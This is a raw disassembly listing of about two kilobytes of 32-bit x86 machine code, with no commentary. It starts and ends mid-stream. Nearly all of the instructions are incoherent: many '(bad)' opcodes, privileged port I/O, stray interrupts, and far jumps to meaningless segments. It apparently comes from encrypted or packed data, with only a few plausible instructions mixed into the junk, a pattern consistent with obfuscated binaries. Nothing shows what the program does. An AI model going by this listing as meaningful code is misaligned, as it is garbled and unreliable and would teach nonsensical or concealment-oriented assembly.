  41304c:	or     BYTE PTR ds:0x710252a3,dh
  413052:	jle    0x41305b
  413054:	or     DWORD PTR [esi],eax
  413056:	mov    dh,0x3f
  413058:	jp     0x413069
  41305a:	retf   
  41305b:	push   eax
  41305c:	shr    BYTE PTR [esi+0x50579424],1
  413062:	adc    al,0x43
  413064:	jmp    0x413010
  413066:	inc    edx
  413067:	dec    ebx
  413068:	stos   BYTE PTR es:[edi],al
  413069:	adc    eax,0xe4489139
  41306e:	sub    eax,0xb7f9df8a
  413073:	es pop ebx
  413075:	hlt    
  413076:	fwait
  413077:	mov    ?,WORD PTR [edi-0x55]
  41307a:	add    al,BYTE PTR [ebp-0x9]
  41307d:	enter  0xae5f,0x11
  413081:	mov    BYTE PTR [ecx+0x6161ba6d],ch
  413087:	and    BYTE PTR ds:0xc656328f,ch
  41308d:	push   edx
  41308e:	push   0x4738f383
  413093:	mov    fs,WORD PTR [esi-0x64]
  413096:	cmp    al,0x8d
  413098:	jge    0x4130a0
  41309a:	and    BYTE PTR [ecx-0x7ac82cd],bh
  4130a0:	xchg   esi,eax
  4130a1:	xchg   esi,eax
  4130a2:	mov    al,0xf7
  4130a4:	icebp  
  4130a5:	jns    0x413108
  4130a7:	xchg   esp,eax
  4130a8:	int    0x13
  4130aa:	add    DWORD PTR [edi-0x6d],eax
  4130ad:	daa    
  4130ae:	jbe    0x413049
  4130b0:	sti    
  4130b1:	retf   0x89d1
  4130b4:	ja     0x4130f8
  4130b6:	sub    DWORD PTR [esp+edx*4+0x2991076b],eax
  4130bd:	cmp    eax,0x8ade94b9
  4130c2:	popa   
  4130c3:	pop    esp
  4130c4:	arpl   WORD PTR [eax],bp
  4130c6:	pushf  
  4130c7:	call   FWORD PTR [edi-0x75]
  4130ca:	add    al,BYTE PTR [eax+0x4f]
  4130cd:	lds    esi,FWORD PTR [ebp-0x76f965fa]
  4130d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130d4:	push   ss
  4130d5:	inc    esi
  4130d6:	xor    ah,BYTE PTR [ebx+edx*4+0x5d]
  4130da:	scas   al,BYTE PTR es:[edi]
  4130db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130dc:	mov    al,0x86
  4130de:	jae    0x413155
  4130e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e1:	mov    ah,0x12
  4130e3:	mov    al,bl
  4130e5:	call   0x4fb74b89
  4130ea:	inc    ecx
  4130eb:	sub    bh,ah
  4130ed:	sub    bh,BYTE PTR [esp+eiz*4-0xe5d7adc]
  4130f4:	add    al,BYTE PTR [esi-0xf]
  4130f7:	fstp   st(5)
  4130f9:	sbb    eax,0x5fb2f4b1
  4130fe:	out    0x96,eax
  413100:	jo     0x41315c
  413102:	mov    ds:0xb9b4653b,eax
  413107:	mov    bh,0x5e
  413109:	xor    al,0xc1
  41310b:	ds loope 0x413142
  41310e:	jns    0x41311e
  413110:	mov    edx,0x7dd54a52
  413115:	imul   eax,DWORD PTR [ebx-0x2fbabad],0x65
  41311c:	neg    ch
  41311e:	lea    edx,[ebx]
  413120:	in     eax,dx
  413121:	pushf  
  413122:	dec    ecx
  413123:	lahf   
  413124:	push   esp
  413125:	retf   0x909
  413128:	inc    eax
  413129:	mov    esp,0x7b74ad9c
  41312e:	sbb    BYTE PTR [ebp+0x1a],ch
  413131:	mov    bh,0xdc
  413133:	ror    BYTE PTR [edi+eax*8+0x20],1
  413137:	int    0x20
  413139:	xchg   BYTE PTR [ebx+0x7d553d65],bh
  41313f:	int    0x3a
  413141:	push   edx
  413142:	in     eax,dx
  413143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413144:	dec    esi
  413145:	imul   esi,DWORD PTR [ebp-0x24],0xffffff89
  413149:	jne    0x413123
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fd79
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e1a8,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	mov    bh,0x5e
  413180:	outs   dx,BYTE PTR ds:[esi]
  413181:	cmp    al,0xa3
  413183:	popa   
  413184:	jo     0x4131f6
  413186:	mov    ecx,0xea70707e
  41318b:	in     eax,0xb4
  41318d:	inc    ebx
  41318e:	jl     0x4131f8
  413190:	or     eax,0xc8a26950
  413195:	or     BYTE PTR [edx+0x3449151f],ah
  41319b:	pop    ds
  41319c:	dec    DWORD PTR [edx+0x63]
  41319f:	sahf   
  4131a0:	aam    0x92
  4131a2:	jne    0x4131e3
  4131a4:	xor    edx,DWORD PTR [ebx-0x14af6619]
  4131aa:	rcl    DWORD PTR [ebp-0x4a2cb7f0],cl
  4131b0:	cli    
  4131b1:	pop    ds
  4131b2:	xchg   ebx,eax
  4131b3:	xchg   esi,eax
  4131b4:	mov    edx,eax
  4131b6:	(bad)  
  4131b7:	lds    ebp,FWORD PTR [eax]
  4131b9:	adc    al,0xf
  4131bb:	and    DWORD PTR [ebx-0x2a],eax
  4131be:	hlt    
  4131bf:	push   ebp
  4131c0:	dec    esp
  4131c1:	call   0xbfa:0xd82e045d
  4131c8:	inc    eax
  4131c9:	sbb    edx,0x5b
  4131cc:	mov    DWORD PTR [ebx-0x5e09e1c1],esi
  4131d2:	mov    dl,0xa3
  4131d4:	push   ebp
  4131d5:	mov    WORD PTR [eax+0x691634ca],ss
  4131db:	leave  
  4131dc:	push   ebx
  4131dd:	js     0x4131cc
  4131df:	mov    dh,0xbf
  4131e1:	cmp    esp,DWORD PTR [ebp-0x2e]
  4131e4:	daa    
  4131e5:	push   edx
  4131e6:	adc    ebx,DWORD PTR gs:[esi]
  4131e9:	adc    ecx,DWORD PTR [ebx+ebp*8-0x6f]
  4131ed:	jbe    0x413263
  4131ef:	inc    edx
  4131f0:	mov    esp,0x49dadd4a
  4131f5:	int    0xef
  4131f7:	mov    al,0x82
  4131f9:	inc    ebp
  4131fa:	cwde   
  4131fb:	pop    eax
  4131fc:	dec    eax
  4131fd:	(bad)  
  4131fe:	gs sub ch,dh
  413201:	pop    eax
  413202:	add    DWORD PTR [edi],eax
  413204:	loope  0x413285
  413206:	jmp    0x722e:0x820c15da
  41320d:	ss test eax,0x65ac612
  413213:	daa    
  413214:	test   DWORD PTR [ebp-0x1d],edi
  413217:	dec    edi
  413218:	sub    DWORD PTR [eax-0xd],0x5aac5ac1
  41321f:	inc    edx
  413220:	scas   al,BYTE PTR es:[edi]
  413221:	pop    esi
  413222:	enter  0xe9a3,0x41
  413226:	add    eax,0xcdf338e6
  41322b:	ds dec eax
  41322d:	push   ecx
  41322e:	push   ds
  41322f:	fsubrp st(4),st
  413231:	sub    esp,DWORD PTR [ebp+ebp*4-0x75]
  413235:	rcl    BYTE PTR [ecx+0x46],0xe5
  413239:	out    0xdf,al
  41323b:	loopne 0x413283
  41323d:	push   es
  41323e:	and    al,0x9c
  413240:	push   edx
  413241:	fsubp  st(7),st
  413243:	leave  
  413244:	xor    al,0x5c
  413246:	mov    al,ds:0xcadd9994
  41324b:	jg     0x4132ac
  41324d:	inc    ax
  41324f:	dec    ebx
  413250:	or     bh,BYTE PTR [eax]
  413252:	int    0xfa
  413254:	int    0x5f
  413256:	mov    cl,0xf2
  413258:	adc    edi,eax
  41325a:	cld    
  41325b:	or     ebp,edi
  41325d:	mov    eax,ebx
  41325f:	pusha  
  413260:	push   cs
  413261:	addr16 loopne 0x413224
  413264:	ret    
  413265:	mov    dl,0x98
  413267:	inc    ecx
  413268:	adc    ch,dh
  41326a:	pop    esi
  41326b:	call   0xc266:0xe9b59c0a
  413272:	sub    eax,esi
  413274:	mov    dl,0x9f
  413276:	dec    edx
  413277:	arpl   WORD PTR [ecx],dx
  413279:	push   ebx
  41327a:	xchg   edi,eax
  41327b:	add    al,0x52
  41327d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41327e:	xor    al,0xf2
  413280:	xchg   esp,eax
  413281:	sub    eax,0xc149c3dd
  413286:	leave  
  413287:	xor    bh,BYTE PTR [edx]
  413289:	push   es
  41328a:	test   DWORD PTR [ecx],esi
  41328c:	popf   
  41328d:	loop   0x4132b8
  41328f:	and    BYTE PTR [ebx+eiz*4],dh
  413292:	add    DWORD PTR [edx+0x5c12113c],eax
  413298:	inc    edx
  413299:	inc    ecx
  41329a:	div    BYTE PTR [esi]
  41329c:	cmp    ecx,edx
  41329e:	pop    ecx
  41329f:	lds    eax,FWORD PTR [esi+0x30]
  4132a2:	js     0x413225
  4132a4:	xchg   edx,eax
  4132a5:	cs or  al,0xbc
  4132a8:	push   ebp
  4132a9:	mov    edi,0x3cf41fc5
  4132ae:	call   0xf2bed02c
  4132b3:	pop    eax
  4132b4:	jne    0x413294
  4132b6:	add    al,0xf6
  4132b8:	call   0xb6497c1e
  4132bd:	mul    BYTE PTR [esi+0x4a07dd41]
  4132c3:	and    al,0x2
  4132c5:	js     0x41329f
  4132c7:	mov    dl,0x19
  4132c9:	mov    esi,0x35b168b4
  4132ce:	pop    esi
  4132cf:	bound  edi,QWORD PTR [ebp+0x44684b82]
  4132d5:	mov    ds:0x33467a9d,eax
  4132da:	std    
  4132db:	xchg   ebp,eax
  4132dc:	stos   BYTE PTR es:[edi],al
  4132dd:	fistp  WORD PTR [ebx+ebx*4+0x30]
  4132e1:	lea    ebp,[ebx+0x5a]
  4132e4:	shr    BYTE PTR [ebx-0x6],0x20
  4132e8:	jg     0x413367
  4132ea:	ss mov ebp,0x864388c2
  4132f0:	test   bh,dl
  4132f2:	mov    WORD PTR [ebx-0x61],es
  4132f5:	sub    cl,BYTE PTR [esi-0x68306da1]
  4132fb:	pop    ebp
  4132fc:	aaa    
  4132fd:	div    ah
  4132ff:	fistp  WORD PTR [ebp+0xfce8e68]
  413305:	nop
  413306:	or     esi,esp
  413308:	mov    dh,0x35
  41330a:	pop    esp
  41330b:	lds    eax,FWORD PTR [eax-0x5614f423]
  413311:	jns    0x413360
  413313:	ret    
  413314:	jle    0x413336
  413316:	cmp    DWORD PTR [ecx-0x4ea8f01b],ebp
  41331c:	jb     0x413338
  41331e:	sbb    al,0x2f
  413320:	lods   eax,DWORD PTR ds:[esi]
  413321:	jbe    0x4132b0
  413323:	add    ecx,DWORD PTR [ebp-0x14]
  413326:	mov    esp,DWORD PTR [esi-0x7]
  413329:	add    al,0xd6
  41332b:	daa    
  41332c:	pop    ebp
  41332d:	clc    
  41332e:	xchg   ebp,eax
  41332f:	push   ds
  413330:	push   esp
  413331:	popw   es
  413333:	in     eax,0x3c
  413335:	jle    0x4132eb
  413337:	and    eax,DWORD PTR [eax-0x48]
  41333a:	push   esi
  41333b:	or     eax,0xe30cd6dd
  413340:	mov    ch,ah
  413342:	and    al,0xc5
  413344:	in     eax,dx
  413345:	iret   
  413346:	in     eax,dx
  413347:	or     eax,0xc908a1dd
  41334c:	ds dec esp
  41334e:	adc    edx,esi
  413350:	lea    edx,[ecx+esi*4+0xe699f81]
  413357:	sub    BYTE PTR [ecx],bh
  413359:	aas    
  41335a:	mov    al,0x24
  41335c:	scas   al,BYTE PTR es:[edi]
  41335d:	push   es
  41335e:	mov    cl,0xfe
  413360:	xchg   ecx,eax
  413361:	cmc    
  413362:	outs   dx,DWORD PTR ds:[esi]
  413363:	sbb    DWORD PTR [edx+esi*2-0x484d67c0],0x3d
  41336b:	cdq    
  41336c:	test   al,0xdf
  41336e:	(bad)  
  41336f:	xchg   ebp,eax
  413370:	mov    bl,0xf2
  413372:	int3   
  413373:	cdq    
  413374:	cmp    DWORD PTR [ebp-0x7a394702],edi
  41337a:	repnz push 0xffffff9c
  41337d:	sbb    eax,0xf023efa8
  413382:	mov    dl,cl
  413384:	sbb    eax,0x840f5713
  413389:	jmp    0xf2f15e8b
  41338e:	std    
  41338f:	fsub   QWORD PTR [edx+0x2a0f7f32]
  413395:	and    eax,0xc709935e
  41339a:	loopne 0x4133a0
  41339c:	dec    edi
  41339d:	das    
  41339e:	and    DWORD PTR [ebx],esi
  4133a0:	pop    ebp
  4133a1:	xchg   DWORD PTR [eax],edi
  4133a3:	adc    edi,0x49
  4133a6:	test   BYTE PTR [edi+0x7bc116b2],ah
  4133ac:	dec    ecx
  4133ad:	xchg   esi,eax
  4133ae:	pop    ebx
  4133af:	add    edx,0xc857752d
  4133b5:	inc    esp
  4133b6:	aam    0x27
  4133b8:	jne    0x4133ef
  4133ba:	push   ebx
  4133bb:	fbstp  TBYTE PTR [ebp+0x47]
  4133be:	pop    ebx
  4133bf:	aaa    
  4133c0:	fdiv   DWORD PTR es:[ebp+0x11]
  4133c4:	adc    ax,0x34bd
  4133c8:	lock lods al,BYTE PTR ss:[esi]
  4133cb:	(bad)  
  4133cc:	(bad)  
  4133cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ce:	int    0xa
  4133d0:	sbb    DWORD PTR [ebx-0x6c6d10c5],eax
  4133d6:	push   ss
  4133d7:	xchg   DWORD PTR [eax+0x73],ecx
  4133da:	es loop 0x413364
  4133dd:	push   DWORD PTR [ebx]
  4133df:	scas   eax,DWORD PTR es:[edi]
  4133e0:	xor    eax,0xdfb08384
  4133e5:	dec    esp
  4133e6:	icebp  
  4133e7:	scas   al,BYTE PTR es:[edi]
  4133e8:	add    edx,DWORD PTR [ecx-0x65]
  4133eb:	fwait
  4133ec:	inc    esp
  4133ed:	scas   eax,DWORD PTR es:[edi]
  4133ee:	add    BYTE PTR [esi+0x2f],0x3a
  4133f2:	xor    ah,ah
  4133f4:	inc    edx
  4133f5:	cmp    esi,DWORD PTR [edx+0xfe3c1fa]
  4133fb:	js     0x41339d
  4133fd:	dec    eax
  4133fe:	jne    0x413437
  413400:	shl    edx,cl
  413402:	int    0xeb
  413404:	icebp  
  413405:	daa    
  413406:	or     esp,eax
  413408:	ffreep st(3)
  41340a:	aaa    
  41340b:	pop    edx
  41340c:	(bad)  
  41340d:	loopne 0x4133d1
  41340f:	xchg   edi,eax
  413410:	mov    eax,ds:0x221a3f6e
  413415:	or     al,0xb2
  413417:	fild   DWORD PTR [edi]
  413419:	xor    al,0x10
  41341b:	or     al,ch
  41341d:	test   DWORD PTR [ebx-0x24],eax
  413420:	push   edi
  413421:	sbb    BYTE PTR [esp+0x6d1e9455],al
  413428:	lds    edi,FWORD PTR [eax]
  41342a:	mov    edi,0x95a7b15
  41342f:	mov    ecx,0x8214ae39
  413434:	xor    DWORD PTR [ebx+edx*1-0x447564ca],0x4acdd67e
  41343f:	or     edx,DWORD PTR [edx-0x1b03905e]
  413445:	mov    ds:0x86c08c9f,eax
  41344a:	loop   0x4134c1
  41344c:	or     bl,BYTE PTR [eax+ebp*1]
  41344f:	sub    BYTE PTR ds:0x3eb8cb03,ch
  413455:	and    DWORD PTR [eax],eax
  413457:	add    BYTE PTR [ecx+0x458be04d],cl
  41345d:	loopne 0x41346e
  41345f:	test   BYTE PTR [esi],al
  413461:	pop    ss
  413462:	add    BYTE PTR [eax],al
  413464:	not    DWORD PTR ds:0x42fd79
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fd55,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xbdc1420f,al
  413492:	ins    DWORD PTR es:[edi],dx
  413493:	in     al,dx
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0xdd70707e
  41349c:	arpl   WORD PTR [edi+esi*2+0x1e],di
  4134a0:	loop   0x4134c7
  4134a2:	lods   al,BYTE PTR ds:[esi]
  4134a3:	mov    dh,0x4
  4134a5:	xor    DWORD PTR [ebp+ecx*2-0x21],ecx
  4134a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134aa:	cwde   
  4134ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134ac:	test   al,0x6c
  4134ae:	jbe    0x4134bb
  4134b0:	(bad)  
  4134b1:	call   0xb249:0xef6d0084
  4134b8:	repz or dl,dl
  4134bb:	call   0xc70e5275
  4134c0:	sbb    BYTE PTR [eax+0xf6f456b],ch
  4134c6:	stos   BYTE PTR es:[edi],al
  4134c7:	lods   eax,DWORD PTR ds:[esi]
  4134c8:	fwait
  4134c9:	int    0x43
  4134cb:	xor    bl,BYTE PTR ds:0x10236db4
  4134d1:	mov    eax,ds:0x5da82a50
  4134d6:	in     eax,dx
  4134d7:	adc    DWORD PTR [edx],esi
  4134d9:	std    
  4134da:	dec    esi
  4134db:	fnsave [eax-0x2f80eb4]
  4134e1:	imul   eax,esp,0xfffffff4
  4134e4:	pop    ebx
  4134e5:	test   ebp,ecx
  4134e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134e8:	out    dx,eax
  4134e9:	inc    ecx
  4134ea:	xchg   esi,eax
  4134eb:	push   ebp
  4134ec:	addr16 push esi
  4134ee:	loopne 0x41349b
  4134f0:	popa   
  4134f1:	dec    ebp
  4134f2:	das    
  4134f3:	fimul  DWORD PTR [ecx]
  4134f5:	imul   ebp,DWORD PTR [edx],0x3e
  4134f8:	sub    bl,BYTE PTR [ebp-0x25]
  4134fb:	cmp    DWORD PTR [edi],ebx
  4134fd:	xlat   BYTE PTR ds:[ebx]
  4134fe:	push   ss
  4134ff:	xor    ecx,edx
  413501:	cmp    DWORD PTR [edi+0x5d],edi
  413504:	ret    0x3a9d
  413507:	rcl    DWORD PTR [ebp+0x65],0x37
  41350b:	ror    BYTE PTR [esi-0x58b8cd9b],0x7a
  413512:	out    0x9a,al
  413514:	(bad)  
  413516:	inc    DWORD PTR [esi-0x12]
  413519:	mov    BYTE PTR [edi],ch
  41351b:	pop    ss
  41351c:	mov    bh,0xbd
  41351e:	jecxz  0x4134c9
  413520:	fwait
  413521:	mov    eax,ds:0xc3ccbb99
  413526:	sbb    al,0x4c
  413528:	call   0x62e188db
  41352d:	cs xchg edx,eax
  41352f:	lods   eax,DWORD PTR ds:[esi]
  413530:	stos   DWORD PTR es:[edi],eax
  413531:	cs mov edi,0x6b69cc7b
  413537:	(bad)  
  413538:	or     BYTE PTR [ebp+0x50],dl
  41353b:	cmp    al,0xca
  41353d:	test   eax,0x4582b400
  413542:	push   0xd
  413544:	dec    ebp
  413545:	in     al,dx
  413546:	outs   dx,DWORD PTR ds:[esi]
  413547:	cmp    BYTE PTR [eax+0x2ab02f5b],0xb8
  41354e:	cmp    ebx,DWORD PTR [ecx-0x27]
  413551:	(bad)  
  413552:	mov    al,0x2b
  413554:	inc    eax
  413555:	imul   ebp,DWORD PTR [edi-0x6b684803],0xffffff92
  41355c:	scas   eax,DWORD PTR es:[edi]
  41355d:	and    al,0x29
  41355f:	(bad)  
  413560:	hlt    
  413561:	(bad)  
  413562:	push   cs
  413563:	fs leave 
  413565:	or     ah,BYTE PTR [ecx+0x587970bb]
  41356b:	push   edx
  41356c:	inc    esi
  41356d:	stc    
  41356e:	stc    
  41356f:	daa    
  413570:	sbb    ebx,0x8f0e9c80
  413576:	mov    eax,ds:0xe9552eff
  41357b:	dec    eax
  41357c:	dec    esp
  41357d:	dec    edx
  41357e:	adc    BYTE PTR [ebp+0x3fb8a89a],bl
  413584:	and    al,BYTE PTR [ebp+0x7feafd4d]
  41358a:	jp     0x413564
  41358c:	xchg   BYTE PTR [edi+0x3c],ah
  41358f:	inc    ebp
  413590:	out    0xae,eax
  413592:	cmp    al,0x77
  413594:	mov    eax,ds:0xb799d94
  413599:	adc    eax,0x8d789f3a
  41359e:	test   DWORD PTR [esi+eiz*8-0x13],esp
  4135a2:	xchg   esp,eax
  4135a3:	les    edx,FWORD PTR [edi]
  4135a5:	stos   BYTE PTR es:[edi],al
  4135a6:	sahf   
  4135a7:	xchg   bl,dh
  4135a9:	jo     0x41356d
  4135ab:	jnp    0x413628
  4135ad:	popf   
  4135ae:	push   eax
  4135af:	int3   
  4135b0:	aas    
  4135b1:	pop    esp
  4135b2:	cli    
  4135b3:	push   esp
  4135b4:	push   esi
  4135b5:	(bad)  
  4135b6:	mul    DWORD PTR [ebx+0xd]
  4135b9:	sbb    al,0xcb
  4135bb:	xor    eax,0x94e25fa1
  4135c0:	and    BYTE PTR [edi],0xda
  4135c3:	jns    0x41354b
  4135c5:	arpl   si,di
  4135c7:	jmp    0x39d0:0xf23a4b0a
  4135ce:	cs jne 0x413625
  4135d1:	xor    ecx,DWORD PTR [edi-0x631dde0d]
  4135d7:	retf   0xb650
  4135da:	adc    al,BYTE PTR [edi-0x18ee547f]
  4135e0:	popa   
  4135e1:	dec    ebp
  4135e2:	xor    BYTE PTR [ebx],dl
  4135e4:	stc    
  4135e5:	xchg   BYTE PTR [ebx-0x52],bh
  4135e8:	pushf  
  4135e9:	dec    ecx
  4135ea:	(bad)  
  4135eb:	cmp    al,0xee
  4135ed:	cmp    al,0xae
  4135ef:	icebp  
  4135f0:	dec    ecx
  4135f1:	fist   DWORD PTR [edi-0x2b0ab1e9]
  4135f7:	cmc    
  4135f8:	ret    0xedaf
  4135fb:	cmp    BYTE PTR [ebp-0x69],0xee
  4135ff:	sub    al,0xce
  413601:	fsub   DWORD PTR [esi+0x6116dae5]
  413607:	jmp    0x413612
  413609:	mov    al,ds:0x9f041389
  41360e:	retf   
  41360f:	adc    BYTE PTR [edi+0x46],dh
  413612:	jl     0x4135ec
  413614:	mov    bh,0x3e
  413616:	lods   eax,DWORD PTR ds:[esi]
  413617:	and    BYTE PTR [ecx+eiz*1+0x6],al
  41361b:	xchg   DWORD PTR [ecx],ebp
  41361d:	imul   edi,DWORD PTR [eax],0x23
  413620:	xchg   BYTE PTR [edi+0x2c0133e],ch
  413626:	out    0x2f,al
  413628:	retf   0x896a
  41362b:	loope  0x4136a4
  41362d:	cmp    eax,0x97c09148
  413632:	xor    esp,DWORD PTR [ecx+ebx*8]
  413635:	mov    ah,ch
  413637:	and    DWORD PTR [ebp+eax*1+0x27],ebp
  41363b:	out    0x6f,al
  41363d:	jl     0x413648
  41363f:	add    BYTE PTR [eax-0x79220815],ch
  413645:	scas   al,BYTE PTR es:[edi]
  413646:	outs   dx,DWORD PTR ds:[esi]
  413647:	or     ecx,esi
  413649:	dec    ecx
  41364a:	lea    edi,[ebp-0xbee0068]
  413650:	int3   
  413651:	retf   
  413652:	call   0x8a6e2d7f
  413657:	inc    esp
  413658:	dec    ebp
  413659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41365a:	and    al,0xe9
  41365c:	xchg   BYTE PTR [ebx],bl
  41365e:	adc    ecx,0x56fdbfcd
  413664:	xchg   edx,eax
  413665:	mov    dh,dl
  413667:	and    DWORD PTR [edx+0x46],edx
  41366a:	ss inc ebx
  41366c:	ficom  WORD PTR ds:0x39ca4f69
  413672:	and    edx,DWORD PTR [esi-0xa34c1de]
  413678:	aaa    
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	in     al,0xa1
  41367c:	mov    dl,0xef
  41367e:	das    
  41367f:	fnsave [ecx+ecx*2+0x19]
  413683:	push   eax
  413684:	sti    
  413685:	push   ds
  413686:	test   dh,0x24
  413689:	mov    ebp,0xf613f6a4
  41368e:	int    0xaf
  413690:	ins    BYTE PTR es:[edi],dx
  413691:	push   ss
  413692:	and    dl,BYTE PTR [eax+0x3d261ac0]
  413698:	jbe    0x413690
  41369a:	cmp    bl,0xa1
  41369d:	cli    
  41369e:	and    al,0xae
  4136a0:	xor    BYTE PTR [edi],bh
  4136a2:	sbb    ah,bl
  4136a4:	mov    ds:0x836f61b1,al
  4136a9:	(bad)  
  4136aa:	adc    al,0x30
  4136ac:	sub    bh,BYTE PTR [eax]
  4136ae:	mov    esp,0x4bdad97e
  4136b3:	and    DWORD PTR ds:0x8c854e65,edi
  4136b9:	jnp    0x413651
  4136bb:	push   eax
  4136bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136bd:	sub    DWORD PTR [esi],0x58
  4136c0:	cmp    eax,0x8a354694
  4136c5:	or     DWORD PTR [ebp-0x38333d12],esp
  4136cb:	sub    BYTE PTR [ebp+0x52],ch
  4136ce:	add    al,0x47
  4136d0:	dec    esp
  4136d1:	aam    0xf9
  4136d3:	outs   dx,BYTE PTR ds:[esi]
  4136d4:	jle    0x4136cc
  4136d6:	lods   al,BYTE PTR ds:[esi]
  4136d7:	cmc    
  4136d8:	xor    ebx,DWORD PTR [ebp+esi*2+0x2a]
  4136dc:	adc    eax,0x5ac7f3b8
  4136e1:	mov    bl,BYTE PTR [edi-0x4f]
  4136e4:	and    BYTE PTR [ecx-0x54e3543a],ch
  4136ea:	int    0xc5
  4136ec:	adc    DWORD PTR [ebp+0x3e36a04a],0xffffffd9
  4136f3:	and    BYTE PTR [ebp-0x6b],ah
  4136f6:	scas   eax,DWORD PTR es:[edi]
  4136f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136f8:	push   ebp
  4136f9:	(bad)  
  4136fa:	mov    dl,0x47
  4136fc:	stos   BYTE PTR es:[edi],al
  4136fd:	sbb    esp,0x25
  413700:	adc    DWORD PTR [eax],ecx
  413702:	loop   0x413708
  413704:	retf   
  413705:	push   cs
  413706:	pop    ebp
  413707:	xchg   edx,eax
  413708:	cmp    BYTE PTR [edi-0x69],dh
  41370b:	xchg   esi,eax
  41370c:	in     eax,dx
  41370d:	in     al,0xe3
  41370f:	cmc    
  413710:	sahf   
  413711:	test   eax,0x6d45620e
  413716:	es push edi
  413718:	or     esp,DWORD PTR [edx]
  41371a:	push   ebx
  41371b:	dec    esi
  41371c:	jns    0x41373e
  41371e:	or     al,0xbf
  413720:	push   ds
  413721:	jge    0x41379a
  413723:	inc    ecx
  413724:	ret    
  413725:	cmc    
  413726:	pop    ds
  413727:	cmp    DWORD PTR [ecx+0x63],ecx
  41372a:	mov    dh,BYTE PTR [ebx+ebx*2-0x6757b4dd]
  413731:	repz jne 0x413723
  413734:	mov    dl,cl
  413736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413738:	or     BYTE PTR [ebx+0x4fb11772],dh
  41373e:	add    BYTE PTR [edi+0x6c],0xfe
  413742:	add    DWORD PTR [ebx-0x43d9aa62],ebp
  413748:	push   0xffffffdb
  41374a:	js     0x4137b5
  41374c:	push   ss
  41374d:	pop    esi
  41374e:	jbe    0x413790
  413750:	cmc    
  413751:	jno    0x4137b8
  413753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413754:	jmp    0xec78:0x68e576fb
  41375b:	test   eax,0x1cd068b3
  413760:	xor    BYTE PTR [eax-0x7af007c5],dh
  413766:	test   DWORD PTR [edx],ecx
  413768:	add    BYTE PTR [eax],al
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	dec    ecx
  41377f:	mov    ds:0x6b3521a5,al
  413784:	jo     0x4137f6
  413786:	mov    ecx,0x1970707e
  41378b:	inc    edx
  41378c:	add    DWORD PTR [ecx+0x15],edi
  41378f:	stos   BYTE PTR es:[edi],al
  413790:	cmp    esp,DWORD PTR [edx]
  413792:	push   eax
  413793:	push   esp
  413794:	or     dl,BYTE PTR ds:0x29ccf5aa
  41379a:	xor    eax,0xcd87952a
  41379f:	pop    eax
  4137a0:	jmp    0x3498:0xe9bdde53
  4137a7:	mov    eax,0x872a20c2
  4137ac:	push   esi
  4137ad:	out    0x41,eax
  4137af:	pop    ecx
  4137b0:	push   ds
  4137b1:	xor    BYTE PTR [edi],bl
  4137b3:	xchg   ebp,eax
  4137b4:	imul   esp,DWORD PTR [eax],0x9060a9b4
  4137ba:	int3   
  4137bb:	pop    ss
  4137bc:	xor    al,0x93
  4137be:	add    DWORD PTR [ecx+0x3f2fd4e4],esp
  4137c4:	rcl    DWORD PTR [esp+edx*8],cl
  4137c7:	mov    edx,0x94ca4ee
  4137cc:	mov    al,ds:0xeae47d1
  4137d1:	inc    edx
  4137d2:	jle    0x41383c
  4137d4:	pop    eax
  4137d5:	stos   BYTE PTR es:[edi],al
  4137d6:	pop    ss
  4137d7:	ins    DWORD PTR es:[edi],dx
  4137d8:	out    dx,eax
  4137d9:	jl     0x41378b
  4137db:	fmul   QWORD PTR [edi+eiz*2+0x6a67d63]
  4137e2:	cmp    esi,DWORD PTR [ecx-0x9]
  4137e5:	repz sbb DWORD PTR [eax-0x5165658],eax
  4137ec:	das    
  4137ed:	shr    esp,cl
  4137ef:	jg     0x413822
  4137f1:	cwde   
  4137f2:	adc    DWORD PTR [eax-0x78],ecx
  4137f5:	into   
  4137f6:	js     0x41385a
  4137f8:	mov    ?,eax
  4137fa:	fist   DWORD PTR [edi+eax*2+0x63]
  4137fe:	inc    edx
  4137ff:	fstp   TBYTE PTR [edi-0x43b4647d]
  413805:	jmp    0x5da6f8f
  41380a:	(bad)  
  41380b:	nop
  41380c:	sbb    eax,0xba2f5b45
  413811:	pop    ecx
  413812:	jb     0x413824
  413814:	outs   dx,BYTE PTR ds:[esi]
